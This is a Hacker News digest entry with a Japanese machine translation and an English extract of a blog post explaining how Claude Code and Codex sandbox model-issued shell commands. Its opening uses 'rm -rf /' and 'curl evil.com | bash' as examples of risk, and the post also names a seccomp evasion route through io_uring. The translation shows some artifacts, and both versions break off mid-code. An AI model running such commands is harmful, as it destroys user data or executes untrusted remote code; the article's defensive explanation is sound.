---
source: "https://instavm.io/blog/how-claude-code-and-codex-approach-sandboxing"
hn_url: "https://news.ycombinator.com/item?id=48721880"
title: "How Claude Code and Codex approach sandboxing"
article_title: "How Claude Code & Codex approach sandboxing | InstaVM"
author: "mkagenius"
captured_at: "2026-06-29T17:56:11Z"
capture_tool: "hn-digest"
hn_id: 48721880
score: 2
comments: 1
posted_at: "2026-06-29T17:03:47Z"
tags:
  - hacker-news
  - translated
---

# How Claude Code and Codex approach sandboxing

- HN: [48721880](https://news.ycombinator.com/item?id=48721880)
- Source: [instavm.io](https://instavm.io/blog/how-claude-code-and-codex-approach-sandboxing)
- Score: 2
- Comments: 1
- Posted: 2026-06-29T17:03:47Z

## Translation

タイトル: Claude Code と Codex によるサンドボックスへのアプローチ
記事のタイトル: Claude Code と Codex によるサンドボックスへのアプローチ |インスタVM
説明: OpenAI の Codex と Anthropic の Claude Code が、LLM がマシン上で任意のコマンドを実行するのをどのように防ぐか。同じ OS プリミティブでも、異なる信頼アーキテクチャ。

記事本文:
Claude Code と Codex によるサンドボックスへのアプローチ | InstaVM InstaVM Docs 価格設定 ソリューション リソース ブログ ログイン はじめる ブログに戻る Abhishek · 2026 年 4 月 5 日 · 18 分で読む Claude Code と Codex によるサンドボックスへのアプローチ
LLM がユーザーに代わって rm -rf / を実行することを決定した場合、何がそれを停止させるのでしょうか?
Codex と Claude Code はどちらも、AI モデルがマシン上でシェル コマンドを実行できるようにします。モデルはコードを読み取り、何を行うかを決定し、コマンドを実行します。それはリスクでもあります。 npm install を実行できる言語モデルは、curl evil.com も実行できます。バッシュ。ソース ディレクトリに書き込むことができるモデルは、SSH キーにも書き込むことができます。
どちらのシステムも、OS レベルのプロセスのサンドボックス化という同じ答えに到達しました。どちらも同じ OS プリミティブに到達しました。しかし、彼らはそれらのプリミティブを異なる信頼アーキテクチャに埋め込みました。 Codex はサンドボックスを必須の封じ込め境界として扱い、デフォルトではサンドボックスが優先されますが、ポリシーの適用が必要ない場合、管理者はサンドボックスなしを解決できます。 Claude Code は、これを、開発者がコマンドごとに調整、緩和、またはオーバーライドできる構成可能な分離レイヤーとして扱います。
この記事では、LLM がシェル コマンドを発行した瞬間から結果が返される瞬間まで、両方のシステムにおける完全なサンドボックス フローについて説明します。
1. 背景: OS のプリミティブ
Docker を使用したことがある場合は、これらのプリミティブの一部をすでに間接的に使用していることになります。 Docker コンテナは、Linux 名前空間 (バブルラップが使用するのと同じメカニズム) を使用してプロセスを分離します。以下の概念は、Docker とこれらのサンドボックス システムの両方が構築される下位レベルの構成要素です。
Bubblewrap: Linux でのファイルシステムの分離
Bubblewrap ( bwrap ) は、プロセスのファイル システムの偽のビュー、つまり特定のフォルダーのみが書き込み可能なハード ドライブの読み取り専用コピーを作成します。
それはこれを行います

y Linux ネームスペース、さまざまなシステム リソース用に分離された環境を作成します。マウント名前空間は、プロセスに独自のファイルシステム ビューを与えます。 PID 名前空間は他のプロセスを隠します。ネットワーク名前空間は、プロセスをホスト ネットワーク スタックから分離します。ユーザー名前空間は、権限の昇格を防ぎます。
--ro-bind // ホスト ファイルシステム全体をサンドボックス内で読み取り専用としてマウントします。
--bind は、読み取り専用ベース上に特定のパスを書き込み可能として再マウントします。
--unshare-net は、新しいネットワーク名前空間を作成し、プロセスをホスト ネットワークから分離します。
--tmpfs は空の一時ファイルシステムをマウントし、そのパスにあったものをすべて隠します。
--dev /dev および --proc /proc は、最小限のデバイス ノードとプロセス情報を提供します。
Codex と Claude Code はどちらも同じ bwrap バイナリを呼び出します。 Codex は Rust で引数リストを構築します。 Claude Code は TypeScript で構築します。
Seccomp/BPF: Linux での syscall フィルタリング
bubblewrap がプロセスが何を認識できるかを制御する場合、seccomp はプロセスが何を実行できるかを制御します。 Seccomp (セキュア コンピューティング) は、プロセスが行うすべてのシステム コールをインターセプトする BPF (バークレー パケット フィルター) プログラムをカーネルにインストールします。システムコールがブロックされたルールに一致する場合、カーネルは操作が実行される前に EPERM を返します。ネットワーク ポートの代わりにシステム コール用のファイアウォール。
両方のシステムが同じ重要なシステムコールをブロックします。
io_uring_setup 、 io_uring_enter 、 io_uring_register : Linux の io_uring サブシステムは、socket() システムコールを経由せずに、カーネル コンテキストで操作 (ソケットの作成を含む) を実行できます。プロセスは seccomp のソケット ブロック ルールを完全にバイパスする可能性があります。両チームは独立してこの回避ベクトルを特定し、3 つの io_uring システムコールをすべてブロックしました。
条件付きフィルタリングを使用したsocket(): すべてのソケットをブロックするのではなく、両方のシステムがBPF引数検査を使用してaddrによってフィルタリングします。

ess ファミリですが、方向はネットワーク モードによって異なります。制限モードの Codex は、AF_UNIX (ローカル IPC) のみを許可し、AF_INET / AF_INET6 (ネットワーク) をブロックします。プロキシ ルーティング モードでは、Codex はこれを逆にします。AF_UNIX をブロックしながら (プロキシのバイパスを防止し)、AF_INET / AF_INET6 (トラフィックがプロキシへのローカル TCP ブリッジに到達できるように) を許可します。 Claude Code の seccomp フィルターはプロキシ ルーティング パターンに従います。つまり、AF_UNIX をブロックし、AF_INET / AF_INET6 を許可し、すべてのトラフィックを socat TCP ブリッジ経由でルーティングします。
seccomp フィルターをインストールする前に、プロセスは prctl(PR_SET_NO_NEW_PRIVS) を呼び出して、setuid バイナリを通じて特権を回復できないことを確認する必要があります。 Codex は、Rust の seccompiler クレートを介して BPF プログラムをコンパイルします。クロード コードは、 libseccomp で構築されたプリコンパイルされた C バイナリ ( apply-seccomp ) を使用します。
シートベルト: macOS 上のカーネルレベルのサンドボックス
macOS には、Seatbelt と呼ばれる独自のサンドボックス システムがあります。これは、TrustedBSD 必須アクセス制御フレームワークを通じてカーネル レベルで機能します。ポリシーがプロセスに適用されると、カーネルが許可する前に、開いているすべてのファイル、ネットワーク接続、プロセスの生成、および IPC 操作がポリシーに対してチェックされます。インターセプトまたはバイパスするユーザー空間フックはありません。ポリシー言語は SBPL (Sandbox Profile Language) です。Scheme に似た構文を持つ DSL で、プロセスに許可される内容を宣言し、カーネルがそれ以外のすべてを拒否します。指定されたプロファイルでコマンドを実行するには、sandbox-exec -p を呼び出します。
Apple は macOS 10.15 で Sandbox-exec を非推奨にしましたが、基礎となるカーネル強制は依然としてアクティブであり、広く使用されています。この記事の Chromium、VS Code、および両方のシステムは、運用環境でこれに依存しています。
両方のシステムのすべてのシートベルト ポリシーは同じように開始されます。
(バージョン1)
( デフォルトを拒否 ) これは、デフォルトですべてを拒否することを意味します。次に、ポリシーは明示的なものを追加します

手当:
(ファイル読み取りを許可* (サブパス "/usr" ) ) ;システムライブラリを読み取る
(ファイル書き込みを許可* (サブパス "/workspace" ) ) ;ワークスペースに書き込む
(ネットワークアウトバウンドを許可します (リモート IP "localhost:3128" ) ) ;プロキシのみ どちらのシステムも -D KEY=VALUE パラメータ化パターンを使用して SBPL テンプレートにパスを挿入し、パス挿入の脆弱性を回避します。 Codex は SBPL プロファイルを Rust でアセンブルします。 Claude Code は TypeScript でそれらをアセンブルします。
2. 2 つのアーキテクチャの概要
Web 開発者向けの例え: Codex は、サーバーが強制し、クライアントがオプトアウトできない必須の Content-Security-Policy ヘッダーのようなものです。 Claude Code は構成可能な CSP のようなもので、開発者が何をしようとしているのかがわかったら、リクエストごとに緩和できます。
フローチャート LR
サブグラフ Codex["Codex"]
C1["LLM がツール呼び出しを発行する"] --> C2["SandboxPolicy\nenum が評価されました"]
C2 --> C3[" should_require_\nplatform_sandbox()?"]
C3 --> C4["サンドボックスマネージャー\n::transform()"]
C4 --> C5["引数を書き換えました\n実行されました"]
C5 --> C6{"ブロックされましたか?"}
C6 -->|はい| C7["エスカレートリクエスト\n→ ユーザーの承認"]
C6 -->|いいえ| C8["返された結果"]
C7 --> C8
終わり
サブグラフ CC["クロード コード"]
Q1["LLM がツール呼び出しを発行する"] --> Q2["ShouldUseSandbox()"]
Q2 -->|はい| Q3["SandboxManager\n.wrapWithSandbox()"]
Q2 -->|いいえ| Q4[「直接実行する」]
Q3 --> Q5["ラップされたコマンド\n実行されました"]
Q5 --> Q6["cleanupAfterCommand()"]
Q4 --> Q7[「結果が返されました」]
第6問 --> 第7問
3. エンドツーエンドのチュートリアル: Codex
すべての Codex セッションは SandboxPolicy で始まります。 SandboxPolicy は、ユーザーが許可する内容を記述する 4 つのバリアントを含む Rust 列挙型です。
DangerFullAccess : 制限なし。コマンドはサンドボックスなしで実行されます。このバリアントは、型システムがすべてのコード パスに「サンドボックスなし」の場合を明示的に処理するよう強制するために存在します。
ReadOnly : 読み取り専用ファイルシステムアクセス。アクセス フィールド (フルディスクまたはリソース) を保持します。

特定のルートに限定されます) と network_access ブール値。
WorkspaceWrite : ワークスペースは書き込み可能であり、オプションで writable_roots を追加できます。読み取り専用アクセス設定、ネットワーク アクセス、および一時ディレクトリ除外フラグも保持します。
外部サンドボックス : プロセスはすでに外部サンドボックス (コンテナーなど) 内にあります。 Codex は独自のサンドボックス化をスキップしますが、ネットワーク ポリシーを強制します。
ファイルシステムとネットワーク アクセスは独立した次元 ( FileSystemSandboxPolicy および NetworkSandboxPolicy ) としてモデル化されるため、システムは組み合わせ爆発を起こすことなく、「ネットワークを持たない書き込み可能なファイル システム」または「プロキシ ルーティングされたネットワークを備えた読み取り専用のファイル システム」を表現できます。
pub enum サンドボックスポリシー {
危険フルアクセス、
読み取り専用 {
アクセス : ReadOnlyAccess 、
network_access : bool 、
} 、
外部サンドボックス {
network_access : ネットワークアクセス 、
} 、
ワークスペース書き込み {
writable_roots : Vec < AbsolutePathBuf > 、
read_only_access : ReadOnlyAccess 、
network_access : bool 、
exclude_tmpdir_env_var : bool 、
exclude_slash_tmp : bool 、
} 、
Rust コンパイラは徹底的なマッチングを強制します。サンドボックス ポリシーに触れるすべてのコード パスは、4 つのバリアントすべてを処理する必要があります。
SandboxManager::select_initial() は、プラットフォーム サンドボックスが必要かどうか、およびどのバックエンドを使用するかを決定します。 should_require_platform_sandbox() を通じてポリシーのセマンティクスを評価します。
管理されたネットワーク要件がアクティブ → 常にサンドボックス。
ネットワークが制限されており、ファイルシステムが外部サンドボックス→サンドボックスではありません。
ファイルシステム フルディスク書き込み→サンドボックス未満で制限されています。
ファイルシステム無制限または外部サンドボックス → サンドボックスは必要ありません。
呼び出し元は、SandboxablePreference : Auto (決定ロジックを使用)、Require (常にサンドボックス)、または Forbid (決してサンドボックスしない) でオーバーライドできます。マネージャーがサンドボックスが必要であると判断すると、get_platform_sandbox() がバックエンドを選択します。

macOS では cosSeatbelt、Linux では LinuxSeccomp、Windows では WindowsRestrictedToken。
ステージ 3: コマンド変換
SandboxManager::transform() は、コマンドの argv をサンドボックス呼び出しに書き換えます。
macOS : 元のコマンドは /usr/bin/sandbox-exec -p の引数になります。
Linux : 元のコマンドは、bubblewrap と seccomp を調整する codex-linux-sandbox ヘルパー バイナリの末尾引数になります。
Windows : コマンドはほとんど変更されずに通過します。 Windows の強制は、 CreateRestrictedToken を介してプロセス トークン レベルで行われます。
Linux では、施行には 3 段階のパイプラインが使用されます。
外部ステージ : ヘルパー バイナリはポリシーを解析し、必要に応じてプロキシ ルーティング ブリッジを準備し、バブルラップを呼び出します。
Bubblewrap ステージ : 階層化マウントを使用してファイルシステム名前空間を作成します。読み取り専用ルート、デバイス ノード、書き込み可能ルート、保護されたサブパス カーブアウトの順です。
内部ステージ : サンドボックス内のヘルパー バイナリを再入力します。 PR_SET_NO_NEW_PRIVS を設定し、 seccomp BPF フィルター ( ptrace 、 io_uring_* 、および条件付きソケット フィルターをブロックする) をインストールし、プロキシ ルーティングをアクティブ化し、最後のコマンドに execvp() を組み込みます。
macOS では、基本シートベルト ポリシーは (デフォルトを拒否) で始まり、プロセスの実行、ファイル システム アクセス、およびネットワーク プロキシ ポートの許可を追加します。
サンドボックス化されたコマンドがブロックされた操作にヒットすると、ランタイムはパッチ適用されたシェルを通じてブロックされた execve() 呼び出しをインターセプトし、コマンド、argv、作業ディレクトリ、および環境を含む EscalateRequest を発行します。このリクエストは、入力されたプロトコルを介してユーザー側の画面に流れ、承認ダイアログが表示されます。
ユーザーは EscalateAction を介して 3 つの結果から選択します: Run (直接実行)、Escalate (より広範な権限で再実行、サンドボックス化されていない、ターンのデフォルトで、またはカスタムごとに実行)

ミッション）、または拒否（ブロックして理由を報告）。
4. エンドツーエンドのチュートリアル: クロード コード
Claude Code のサンドボックス構成は、最大 5 つのソースから組み立てられ、厳密な優先順位に従ってマージされます。
ポリシー設定 (最高): MDM を介したエンタープライズ管理のポリシー。上書きできません。
flagSettings : --settings CLI フラグからの設定。
localSettings : .claude/settings.local.json (gitignored、開発者ごとのオーバーライド)。
projectSettings : ワークスペース内の .claude/settings.json (共有、コミット済み)。
userSettings (最低): ~/.claude/settings.json (グローバル ユーザーのデフォルト)。
マージされたサンドボックス構成には、最上位に直接有効化フラグ ( Sandbox.enabled 、 Sandbox.failIfUnavailable 、 Sandbox.allowUnsandboxedCommands ) と、2 つのネストされたサブセクションがあります: Sandbox.filesystem (4 つのパス リスト:allowWrite 、denyWrite 、denyRead 、allowRead ) および Sandbox.network (ドメイン ホワイトリスト、プロキシ ポート、Unix ソケット コントロール)。
LLM の BashTool がコマンドを実行しようとするたびに、 shouldUseSandbox() はその特定のコマンドをサンドボックス化する必要があるかどうかを評価します。
エクスポート関数 shouldUseSandbox (入力: Partial <SandboxInput>): boolean {
if ( ! SandboxManager . isSandboxingEnabled ( ) ) は false を返します
if (入力が危険です

[切り捨てられた]

## Original Extract

How OpenAI's Codex and Anthropic's Claude Code prevent an LLM from running arbitrary commands on your machine. Same OS primitives, different trust architectures.

How Claude Code & Codex approach sandboxing | InstaVM InstaVM Docs Pricing Solutions Resources Blog Login Get Started Back to blog Abhishek · April 5, 2026 · 18 min read How Claude Code & Codex approach sandboxing
When an LLM decides to run rm -rf / on your behalf, what stops it?
Both Codex and Claude Code let an AI model execute shell commands on your machine. The model reads your code, decides what to do, and runs the command for you. That is also the risk. A language model that can run npm install can also run curl evil.com | bash . A model that can write to your source directory can also write to your SSH keys.
Both systems arrived at the same answer: OS-level process sandboxing. Both reached for the same OS primitives. But they embedded those primitives in different trust architectures. Codex treats sandboxing as a mandatory containment boundary, sandbox-first by default, though the manager can resolve to no sandbox when the policy does not require enforcement. Claude Code treats it as a configurable isolation layer that the developer can tune, relax, or override per command.
This article walks through the complete sandbox flow in both systems, from the moment the LLM emits a shell command to the moment the result comes back.
1. Background: The OS Primitives
If you have used Docker, you have already used some of these primitives indirectly. Docker containers use Linux namespaces (the same mechanism bubblewrap uses) to isolate processes. The concepts below are the lower-level building blocks that both Docker and these sandboxing systems build on.
Bubblewrap: filesystem isolation on Linux
Bubblewrap ( bwrap ) creates a fake view of the filesystem for a process: a read-only copy of your hard drive where only certain folders are writable.
It does this by creating Linux namespaces , isolated environments for different system resources. A mount namespace gives the process its own filesystem view. A PID namespace hides other processes. A network namespace isolates the process from the host network stack. A user namespace prevents privilege escalation.
--ro-bind / / mounts the entire host filesystem as read-only inside the sandbox.
--bind re-mounts a specific path as writable on top of the read-only base.
--unshare-net creates a fresh network namespace, isolating the process from the host network.
--tmpfs mounts an empty temporary filesystem, hiding whatever was at that path.
--dev /dev and --proc /proc provide minimal device nodes and process information.
Both Codex and Claude Code invoke the same bwrap binary. Codex builds its argument list in Rust. Claude Code builds it in TypeScript.
Seccomp/BPF: syscall filtering on Linux
If bubblewrap controls what a process can see , seccomp controls what a process can do . Seccomp (Secure Computing) installs a BPF (Berkeley Packet Filter) program in the kernel that intercepts every system call the process makes. If the syscall matches a blocked rule, the kernel returns EPERM before the operation executes. A firewall for system calls instead of network ports.
Both systems block the same critical syscalls:
io_uring_setup , io_uring_enter , io_uring_register : Linux's io_uring subsystem can perform operations (including creating sockets) in kernel context without going through the socket() syscall. A process could bypass seccomp's socket-blocking rules entirely. Both teams independently identified this evasion vector and block all three io_uring syscalls.
socket() with conditional filtering : Rather than blocking all sockets, both systems use BPF argument inspection to filter by address family, but the direction depends on the network mode. Codex in restricted mode allows only AF_UNIX (local IPC) while blocking AF_INET / AF_INET6 (network). In proxy-routed mode, Codex reverses this: allows AF_INET / AF_INET6 (so traffic can reach the local TCP bridge to the proxy) while blocking AF_UNIX (preventing bypass of the proxy). Claude Code's seccomp filter follows the proxy-routed pattern: blocks AF_UNIX and allows AF_INET / AF_INET6 , routing all traffic through its socat TCP bridge.
Before installing a seccomp filter, the process must call prctl(PR_SET_NO_NEW_PRIVS) to ensure it cannot regain privileges through setuid binaries. Codex compiles its BPF program via the seccompiler crate in Rust. Claude Code uses a precompiled C binary ( apply-seccomp ) built with libseccomp .
Seatbelt: kernel-level sandboxing on macOS
macOS has its own sandboxing system called Seatbelt. It works at the kernel level through the TrustedBSD mandatory access control framework: once a policy is applied to a process, every file open, network connection, process spawn, and IPC operation is checked against the policy before the kernel allows it. There is no userspace hook to intercept or bypass. The policy language is SBPL (Sandbox Profile Language), a DSL with Scheme-like syntax where you declare what a process is allowed to do and the kernel denies everything else. You invoke sandbox-exec -p to run a command under a given profile.
Apple deprecated sandbox-exec in macOS 10.15, but the underlying kernel enforcement is still active and widely used. Chromium, VS Code, and both systems in this article rely on it in production.
Every Seatbelt policy in both systems starts the same way:
( version 1 )
( deny default ) This means: deny everything by default . Then the policy adds explicit allowances:
( allow file-read* ( subpath "/usr" ) ) ; read system libraries
( allow file-write* ( subpath "/workspace" ) ) ; write to workspace
( allow network-outbound ( remote ip "localhost:3128" ) ) ; proxy only Both systems use the -D KEY=VALUE parameterization pattern to inject paths into the SBPL template, avoiding path injection vulnerabilities. Codex assembles its SBPL profiles in Rust. Claude Code assembles them in TypeScript.
2. The Two Architectures at a Glance
The analogy for web developers: Codex is like a mandatory Content-Security-Policy header where the server enforces it and the client cannot opt out. Claude Code is like a configurable CSP that the developer can relax per request when they know what they are doing.
flowchart LR
subgraph Codex["Codex"]
C1["LLM emits tool call"] --> C2["SandboxPolicy\nenum evaluated"]
C2 --> C3["should_require_\nplatform_sandbox()?"]
C3 --> C4["SandboxManager\n::transform()"]
C4 --> C5["Rewritten argv\nexecuted"]
C5 --> C6{"Blocked?"}
C6 -->|yes| C7["EscalateRequest\n→ user approval"]
C6 -->|no| C8["Result returned"]
C7 --> C8
end
subgraph CC["Claude Code"]
Q1["LLM emits tool call"] --> Q2["shouldUseSandbox()"]
Q2 -->|yes| Q3["SandboxManager\n.wrapWithSandbox()"]
Q2 -->|no| Q4["Execute directly"]
Q3 --> Q5["Wrapped command\nexecuted"]
Q5 --> Q6["cleanupAfterCommand()"]
Q4 --> Q7["Result returned"]
Q6 --> Q7
end 3. End-to-End Walkthrough: Codex
Every Codex session starts with a SandboxPolicy , a Rust enum with four variants that describes what the user intends to permit:
DangerFullAccess : No restrictions. The command runs unsandboxed. This variant exists so the type system forces every code path to handle the "no sandbox" case explicitly.
ReadOnly : Read-only filesystem access. Carries an access field (full-disk or restricted to specific roots) and a network_access boolean.
WorkspaceWrite : The workspace is writable, plus optionally additional writable_roots . Also carries read-only access settings, network access, and temp directory exclusion flags.
ExternalSandbox : The process is already inside an external sandbox (like a container). Codex skips its own sandboxing but still enforces network policy.
Filesystem and network access are modeled as independent dimensions ( FileSystemSandboxPolicy and NetworkSandboxPolicy ) so the system can express "writable filesystem with no network" or "read-only filesystem with proxy-routed network" without a combinatorial explosion.
pub enum SandboxPolicy {
DangerFullAccess ,
ReadOnly {
access : ReadOnlyAccess ,
network_access : bool ,
} ,
ExternalSandbox {
network_access : NetworkAccess ,
} ,
WorkspaceWrite {
writable_roots : Vec < AbsolutePathBuf > ,
read_only_access : ReadOnlyAccess ,
network_access : bool ,
exclude_tmpdir_env_var : bool ,
exclude_slash_tmp : bool ,
} ,
} The Rust compiler enforces exhaustive matching. Every code path that touches sandbox policy must handle all four variants.
SandboxManager::select_initial() decides whether a platform sandbox is needed and which backend to use. It evaluates policy semantics through should_require_platform_sandbox() :
Managed network requirements active → always sandbox.
Network restricted and filesystem is not ExternalSandbox → sandbox.
Filesystem Restricted with less than full disk write → sandbox.
Filesystem Unrestricted or ExternalSandbox → no sandbox needed.
The caller can override with SandboxablePreference : Auto (use the decision logic), Require (always sandbox), or Forbid (never sandbox). Once the manager decides a sandbox is needed, get_platform_sandbox() selects the backend: MacosSeatbelt on macOS, LinuxSeccomp on Linux, WindowsRestrictedToken on Windows.
Stage 3: Command transformation
SandboxManager::transform() rewrites the command's argv into a sandboxed invocation:
macOS : The original command becomes arguments to /usr/bin/sandbox-exec -p .
Linux : The original command becomes trailing arguments to the codex-linux-sandbox helper binary, which orchestrates bubblewrap and seccomp.
Windows : The command passes through mostly unchanged. Windows enforcement happens at the process token level via CreateRestrictedToken .
On Linux, enforcement uses a three-stage pipeline:
Outer stage : The helper binary parses the policy, prepares the proxy routing bridge if needed, and invokes bubblewrap.
Bubblewrap stage : Creates the filesystem namespace with layered mounts. Read-only root, then device nodes, then writable roots, then protected subpath carve-outs.
Inner stage : Re-enters the helper binary inside the sandbox. Sets PR_SET_NO_NEW_PRIVS , installs the seccomp BPF filter (blocking ptrace , io_uring_* , and conditional socket filtering), activates proxy routing, and execvp() into the final command.
On macOS, the base Seatbelt policy starts with (deny default) and then adds allowances for process execution, filesystem access, and network proxy ports.
When a sandboxed command hits a blocked operation, the runtime intercepts the blocked execve() call through a patched shell and emits an EscalateRequest containing the command, argv, working directory, and environment. This request flows through the typed protocol to the user-facing surface, which presents an approval dialog.
The user chooses from three outcomes via EscalateAction : Run (execute directly), Escalate (re-execute with broader permissions, unsandboxed, with turn defaults, or with custom permissions), or Deny (block and report reason).
4. End-to-End Walkthrough: Claude Code
Claude Code's sandbox configuration is assembled from up to five sources, merged in strict priority order:
policySettings (highest): Enterprise-managed policy via MDM. Cannot be overridden.
flagSettings : Settings from the --settings CLI flag.
localSettings : .claude/settings.local.json (gitignored, per-developer overrides).
projectSettings : .claude/settings.json in the workspace (shared, committed).
userSettings (lowest): ~/.claude/settings.json (global user defaults).
The merged sandbox configuration has enablement flags directly at the top level ( sandbox.enabled , sandbox.failIfUnavailable , sandbox.allowUnsandboxedCommands ) and two nested sub-sections: sandbox.filesystem (four path lists: allowWrite , denyWrite , denyRead , allowRead ) and sandbox.network (domain allowlists, proxy ports, Unix socket control).
Every time the LLM's BashTool is about to execute a command, shouldUseSandbox() evaluates whether that specific command should be sandboxed:
export function shouldUseSandbox ( input : Partial < SandboxInput > ) : boolean {
if ( ! SandboxManager . isSandboxingEnabled ( ) ) return false
if ( input . dangerouslyDis

[truncated]
